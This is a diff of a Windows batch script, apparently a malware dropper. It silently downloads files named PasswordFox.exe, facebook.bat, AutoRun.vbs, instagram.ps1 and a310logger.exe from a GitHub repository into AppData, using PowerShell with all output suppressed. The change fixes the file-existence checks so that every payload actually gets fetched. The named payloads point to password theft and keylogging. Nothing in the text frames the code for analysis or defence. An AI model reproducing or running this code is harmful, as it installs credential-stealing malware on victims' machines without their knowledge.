@@ -76,16 +76,16 @@ echo *************DOWNLOAD file****************
    if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
       powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/PasswordFox.exe?raw=true', 'PasswordFox.exe')" > nul 2> nul
    )
-   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (      
+   if not exist "C:\Users\%username%\AppData\Roaming\facebook.bat" (      
       powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/facebook.bat?raw=true', 'facebook.bat')" > nul 2> nul
    )
-   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
+   if not exist "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" (
       powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/AutoRun.vbs?raw=true', 'AutoRun.vbs')" > nul 2> nul
    )
-   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
+   if not exist "C:\Users\%username%\AppData\Roaming\instagram.ps1" (
       powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/instagram.ps1?raw=true', 'instagram.ps1')" > nul 2> nul
    )
-   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
+   if not exist "C:\Users\%username%\AppData\Roaming\a310logger.exe" (
       powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/a310logger.exe?raw=true', 'a310logger.exe')" > nul 2> nul
    )
    if not exist "C:\Users\%username%\AppData\Local\0101\folder.exe" (
@@ -121,16 +121,16 @@ echo *************DOWNLOAD file****************
    if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
       powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/PasswordFox.exe?raw=true -OutFile PasswordFox.exe" > nul 2> nul
    )
-   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
+   if not exist "C:\Users\%username%\AppData\Roaming\facebook.bat" (
       powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/facebook.bat?raw=true -OutFile facebook.bat" > nul 2> nul
    )
-   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
+   if not exist "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" (
       powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/AutoRun.vbs?raw=true -OutFile AutoRun.vbs" > nul 2> nul
    )
-   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
+   if not exist "C:\Users\%username%\AppData\Roaming\instagram.ps1" (
       powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/instagram.ps1?raw=true -OutFile instagram.ps1" > nul 2> nul
    )
-   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
+   if not exist "C:\Users\%username%\AppData\Roaming\a310logger.exe" (
       powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/a310logger.exe?raw=true -OutFile a310logger.exe" > nul 2> nul
    )   
    if not exist "C:\Users\%username%\AppData\Local\0101\folder.exe" (
